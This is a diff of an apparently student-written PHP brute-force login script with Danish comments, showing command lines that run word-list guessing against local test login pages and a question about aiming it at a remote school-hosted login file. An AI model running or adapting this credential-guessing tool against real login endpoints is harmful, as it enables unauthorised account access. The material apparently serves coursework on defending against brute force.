@@ -6,12 +6,32 @@
 
 
 /*
-Run this command from command line in this folder:
-php bruteforce.php -- localhost Security/Sec.1.1/login0Auth.php darkuids.txt darkpwds.txt darkresults.txt
+Min login0Auth_bruteforce_attack_secure.php er her:
+C:\xampp\htdocs\Security\Sec.1.1
+
+bruteforce_hash_vertify.php er her:
+C:\xampp\htdocs\Security\Sec.2.0
+
+Jeg bruger den her komando i terminal, som er beskyttet mod brute force:
+php bruteforce_hash_vertify.php -- localhost Security/Sec.1.1/login0Auth_bruteforce_attack_secure.php darkuids.txt darkpwds.txt darkresults.txt
+
+old uden beskyttelse mod bruteforce:
+php bruteforce_hash_vertify.php -- localhost Security/Sec.1.1/login0Auth.php darkuids.txt darkpwds.txt darkresults.txt
+
+Jeg har problemer med at få den til at virke på vores abakom web
+Jeg vil gerne prøve et brute force forsøg på:
+
+web2.pete334y.iba-abakomp.dk/Yadda/model/Authentication.inc.php
+
+jeg får 400 Bad Request:
+php bruteforce_hash_vertify.php -- http:// web2.pete334y.iba-abakomp.dk/Yadda/model/Authentication.inc.php darkuids.txt darkpwds.txt darkresults.txt
+
+Jeg er lidt i tvivl om http:// skal med når den starter med web2, jeg har prøvet forskellige muligheder uden held.
+
 */
 
 if (count($argv) != 7) {
-    $s = "php bruteforce.php -- localhost urlpath userids passwords results\n";
+    $s = "php bruteforce_hash_vertify.php -- localhost urlpath userids passwords results\n";
     $s .= "the latter three being filenames\n";
     die($s);
 }
@@ -51,7 +71,6 @@ foreach($idsa as $uid) {
             fclose($handle);
             /* Check response */
             var_dump($response);
-            //die();
             preg_match('/Location: \S+/', $response, $m, PREG_OFFSET_CAPTURE);
             if (count($m))
                 $s .= sprintf("\n%s %s", $content, $m[0][0]);
